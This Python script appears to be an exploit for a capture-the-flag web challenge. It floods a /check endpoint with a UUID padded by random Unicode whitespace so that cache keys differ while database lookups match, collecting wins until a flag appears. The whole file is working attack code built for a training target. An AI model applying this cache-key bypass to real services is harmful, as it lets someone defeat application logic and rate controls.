import requests
import time
import re
import argparse
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# Your unique account ID from the challenge
BASE_UUID = "b977b3ff-c7c6-4818-9d82-bb1856588d50"
URL = "https://cache-it-to-win-it.chall.lac.tf/check"

# A pool of trailing characters. In addition to the ordinary space (U+0020),
# we use non-breaking space (U+00A0), em space (U+2003), and thin space (U+2009).
# These should be distinct in the cache key but may be ignored by the DB in comparisons.
TRAILING_POOL = [" ", "\u00A0", "\u2003", "\u2009"]

def generate_random_trailing():
    """Generates a random trailing string from TRAILING_POOL of random length between 1 and 8."""
    length = random.randint(1, 8)
    return "".join(random.choice(TRAILING_POOL) for _ in range(length))

def send_request(variant):
    """
    Sends a GET request to the /check endpoint using the given UUID variant.
    Returns a tuple: (variant, response_text).
    """
    params = {"uuid": variant}
    try:
        response = requests.get(URL, params=params, timeout=5)
        return (variant, response.text.strip())
    except Exception as e:
        return (variant, f"Error: {e}")

def parse_progress(response_text):
    """
    Extracts the wins remaining from the response text.
    Expected format: "Only X more wins to go."
    Returns the wins accumulated (100 - X) if found, else None.
    """
    m = re.search(r"Only\s+(\d+)\s+more wins to go", response_text)
    if m:
        wins_remaining = int(m.group(1))
        return 100 - wins_remaining
    return None

def main():
    parser = argparse.ArgumentParser(
        description="Exploit for 'Cache it to Win it!' CTF challenge using random trailing Unicode whitespace."
    )
    parser.add_argument(
        "--requests-per-batch",
        type=int,
        default=20,
        help="Number of requests to send per batch (default: 20)."
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)."
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=2.0,
        help="Delay in seconds between batches (default: 2.0)."
    )
    args = parser.parse_args()

    total_wins = 0
    flag_found = False
    iteration = 0

    print("Starting exploit using random trailing Unicode whitespace...")
    print("Using your unique account ID:", BASE_UUID)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        while total_wins < 100 and not flag_found:
            iteration += 1
            print(f"\nIteration {iteration}:")
            futures = []
            # For each request in the batch, generate a variant by appending a random trailing string.
            for _ in range(args.requests_per_batch):
                trailing = generate_random_trailing()
                variant = BASE_UUID + trailing
                futures.append(executor.submit(send_request, variant))
            for future in as_completed(futures):
                variant, response_text = future.result()
                print(f"Response for variant '{repr(variant)}':\n{response_text}\n")
                # Check for flag in response.
                if ("CONGRATS! YOU HAVE WON" in response_text.upper() and
                    "FLAG" in response_text.upper()):
                    print("\n=== FLAG FOUND! ===")
                    print(response_text)
                    flag_found = True
                    break
                progress = parse_progress(response_text)
                if progress is not None and progress > total_wins:
                    total_wins = progress
                    print(f"Progress: {total_wins} wins accumulated (need 100).")
            print(f"Batch complete. Total wins so far: {total_wins}.")
            if not flag_found and total_wins < 100:
                time.sleep(args.delay)

    if flag_found:
        print("Exploit succeeded! Flag retrieved.")
    else:
        print("Exploit did not reach 100 wins.")

if __name__ == "__main__":
    main()